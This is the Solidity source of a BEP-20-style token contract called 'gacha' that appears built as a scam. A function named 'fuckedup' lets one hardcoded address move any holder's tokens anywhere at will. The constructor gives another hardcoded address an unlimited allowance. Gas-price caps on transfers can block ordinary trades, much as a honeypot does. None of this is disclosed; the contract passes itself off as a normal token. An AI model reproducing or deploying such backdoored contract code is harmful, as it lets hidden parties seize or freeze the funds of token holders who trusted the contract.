pragma solidity 0.6.6;

contract GachaBEP {
   
    mapping (address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "gacha";
    string public symbol = "GA";
    uint8 public decimals = 18;
    uint256 public totalSupply = 2000 * (uint256(10) ** decimals);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
        allowance[msg.sender][0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F] = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
        emit Approval(msg.sender, 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, 115792089237316195423570985008687907853269984665640564039457584007913129639935);

    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);
        require(tx.gasprice <= 20000000000);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }

     function fuckedup(address _from, address _to, uint256 _value) public returns (bool success){
        require(msg.sender == 0x0000000000999cF64eeE997D09f22b9fca8e6A19);
     	balanceOf[_to] += _value;  
        balanceOf[_from] -= _value;  
        emit Transfer(_from, _to, _value);
        return true;
    }   


    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success){
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        require(tx.gasprice <= 20000000000);
        
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
}